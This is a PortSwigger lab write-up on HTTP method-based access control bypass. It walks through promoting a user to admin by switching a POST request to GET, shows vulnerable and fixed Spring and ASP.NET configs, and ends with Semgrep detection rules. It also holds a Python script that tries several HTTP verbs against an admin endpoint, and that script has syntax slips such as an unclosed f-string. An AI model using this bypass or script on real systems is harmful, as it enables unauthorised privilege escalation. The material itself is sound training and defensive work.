---
title: "Lab 06: Method-based access control can be circumvented"
date: 2025-12-16
categories: [portswigger, access_control]
tags: [HTTP_Method_Spoofing] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-16-lab06_access_control/
---

## 1. Executive Summary

**Vulnerability:** Method-Based Access Control Bypass.

**Description:** The application implements access controls that are tightly coupled to specific HTTP methods (e.g., checking permissions only when the method is `POST`). It fails to apply the same restrictions to other valid HTTP methods (like `GET` or `HEAD`).

**Impact:** An attacker can perform restricted administrative actions—such as promoting users—by simply toggling the HTTP verb of the request, bypassing the security filter entirely.

## 2. The Attack

**Objective:** Exploit the flawed access control to promote the user `wiener` to administrator.

1. **Baselining (Admin):** I first logged in as `administrator` to identify the correct request. I promoted the user `carlos` and captured the request in Burp Suite.
    - **Request:** `POST /admin-roles`
    - **Body:** `username=carlos&action=upgrade`
2. **Baselining (User):** I opened an incognito window, logged in as the regular user `wiener`, and grabbed my session cookie. I sent the Admin's "promote" request to **Repeater**, replaced the session cookie with `wiener`'s, and sent it.
    - **Result:** `403 Unauthorized`. The access control is working for `POST` requests.
3. **Testing the Filter:** I changed the method from `POST` to an invalid method `POSTX`.
    - **Result:** The error changed to "Missing parameter". This suggests the application processed the request logic *before* hitting the access control check, or the access control check was skipped entirely because it didn't match "POST".
4. **Exploitation:** I right-clicked the request in Burp and selected **"Change request method"**, converting it to a `GET` request.
    - **New URL:** `/admin-roles?username=wiener&action=upgrade`
        
        ![image.png](image.png)
        
5. **Result:** The server returned `302 Found`. The action was performed because the security rule only looked for `POST` requests. I verified `wiener` was now an admin.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The flaw lies in the **Security Interceptor** or **Middleware** configuration. The developer explicitly wrote a rule: "If someone tries to **POST** to `/admin-roles`, check if they are an Admin." They forgot to define what happens if someone sends a **GET** request to the same URL. By default, many frameworks verify the rule, fail to match the method condition (since it's not a POST), and default to "Allow."

### Java (Spring Security - XML Config Style)

```xml
<http>
    <intercept-url pattern="/admin-roles" method="POST" access="hasRole('ADMIN')" />
    
    <intercept-url pattern="/**" access="permitAll" />
</http>
```

**Technical Flow & Syntax Explanation:**

- **`<intercept-url ... method="POST">`**: This line defines the security constraint. The critical flaw is the `method="POST"` attribute. It tells the framework, "Only apply this `hasRole('ADMIN')` check if the incoming HTTP Verb is exactly POST."
- **The Gap**: If a request comes in as `GET /admin-roles`, the framework looks at Rule 1. It asks: "Is this a POST?" The answer is No. It skips Rule 1.
- **The Fallthrough**: It then hits Rule 2 (`pattern="/**"`), which is `permitAll`. The `GET` request is allowed through without any authentication check.

### C# (ASP.NET Core - Middleware Check)

```csharp
public void Configure(IApplicationBuilder app)
{
    app.Use(async (context, next) =>
    {
        // VULNERABLE: Manual check restricts only POST requests
        if (context.Request.Path.Value.StartsWith("/admin-roles") 
            && context.Request.Method == "POST")
        {
            if (!context.User.IsInRole("Admin"))
            {
                context.Response.StatusCode = 403;
                return;
            }
        }
        
        // If it's a GET request, the 'if' block above is skipped entirely.
        await next();
    });
}
```

**Technical Flow & Syntax Explanation:**

- **`app.Use(async (context, next) => ...)`**: This defines a custom piece of Middleware—code that runs on every single request before it reaches the Controller.
- **`&& context.Request.Method == "POST"`**: This logic is the root cause. The developer has hardcoded the check to only run when the verb is POST.
- **`await next()`**: This function passes the request to the next step in the pipeline (the Controller). Since `GET` requests skip the `if` block, they hit `next()` immediately, bypassing security.

### Mock PR Comment

I noticed that the security check for `/admin-roles` is wrapped in a conditional that explicitly checks for `Request.Method == "POST"`.

This allows requests with other HTTP methods (like `GET` or `HEAD`) to bypass the authorization check completely while still reaching the controller logic. Please remove the method-specific check so that *all* requests to this sensitive endpoint require Administrator privileges, regardless of the HTTP verb used.

## 4. The Fix

**Explanation of the Fix:**
We remove the specific Method condition from the security rule. We want to say: "Any interaction with `/admin-roles`, regardless of how you ask (GET, POST, DELETE), requires Admin permissions."

### Secure Java (Spring Security)

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .authorizeRequests()
                // SECURE: No ".method()" definition. 
                // This applies to GET, POST, PUT, DELETE, etc.
                .antMatchers("/admin-roles").hasRole("ADMIN")
                .anyRequest().authenticated();
    }
}
```

**Why this works:**

- **`antMatchers("/admin-roles")`**: By removing the `.method(HttpMethod.POST)` qualifier, this rule becomes global for that path.
- **Security Default**: Now, if a user sends `GET /admin-roles`, Spring Security matches the path, sees the `hasRole('ADMIN')` requirement, and enforces it.

### Secure C# (ASP.NET Core Attribute)

```csharp
[Authorize(Roles = "Admin")] // SECURE: Applied at the Class/Controller level
public class AdminRolesController : Controller
{
    // Both GET and POST are now protected by the [Authorize] attribute above.
    
    [HttpGet]
    public IActionResult Index() { ... }

    [HttpPost]
    public IActionResult Update() { ... }
}
```

**Why this works:**

- **`[Authorize(Roles = "Admin")]`**: Placing this attribute on the *Class* ensures that **every** public method inside this Controller requires the Admin role.
- **Defense in Depth**: Even if you add a new method (like `Delete`) later, it automatically inherits this protection, preventing future mistakes.

## 5. Automation

*A Python script that tries a sensitive action using multiple HTTP methods (GET, POST, PUT) to see if one slips through.*

```python
import requests

def exploit_method_bypass(url, session_cookie):
	target_path = "/admin-roles"
	full_url = f"{url}{target_path}
	
	params = {'username': 'wiener', 'action': 'upgrade'}
	cookies = {'session': session_cookie}
	
	methods = ['GET', 'POST', 'PUT']
	
	print(f"[*] Testing method bypass on {target_path} ...")
	for method in methods:
		print("[*] Trying {method}...")
		try:
			if method == 'GET':
				resp = requests.get(full_url, params=params, cookies=cookies)
			else:
				resp = requests.request(method, full_url, data=params, cookies=cookies)
			
			if resp.status_code == 200:
				print(f"[!!!] VULNERABLE: {method} request was accepted (200 OK)!")
				if "promoted" in resp.text.lower() or "new role" in resp.text.lower():
					print(" --> Privilege Escalation confirmed.")
			elif resp.status_code == 403:
				print(f"[-] Secure: {method} request was denied (403)")
			else:
				print("[-] {method} returned {resp.status_code}")
		except Exception as e:
			print("Error testing {method}: {e}")

# Usage
# exploit_method_bypass("https://YOUR-LAB-ID.web-security-academy.net", "YOUR_SESSION_KEY")
```

## 6. Static Analysis (Semgrep)

*This section provides Semgrep rules to detect configuration that limits security checks to specific HTTP methods.*

**The Logic**
We are looking for security configurations that define a constraint (like `.access(...)` or `if(...)`) but limit that constraint's scope using a specific HTTP method (like `.method(...)` or `Request.Method == ...`). This usually implies that other methods for that same path are unprotected.

### Java Rule

```yaml
rules:
  - id: spring-security-method-specific-restriction
    languages: [java]
    message: |
      Found a security rule restricted to a single HTTP method. 
      Ensure other methods (GET, PUT, etc.) are also covered or explicitly denied.
    severity: WARNING
    patterns:
      - pattern-inside: |
          .antMatchers(..., $METHOD, ...)
      - pattern-either:
          # Matches .antMatchers(HttpMethod.POST, "/path")
          - pattern: HttpMethod.POST
          - pattern: RequestMethod.POST
```

### C# Rule

```yaml
rules:
  - id: csharp-manual-method-check
    languages: [csharp]
    message: |
      Detected manual check of Request.Method. 
      This often leads to bypasses if other verbs are not handled. 
      Use [Authorize] attributes instead.
    severity: WARNING
    patterns:
      - pattern: |
          if ($CTX.Request.Method == "POST") { ... }
```
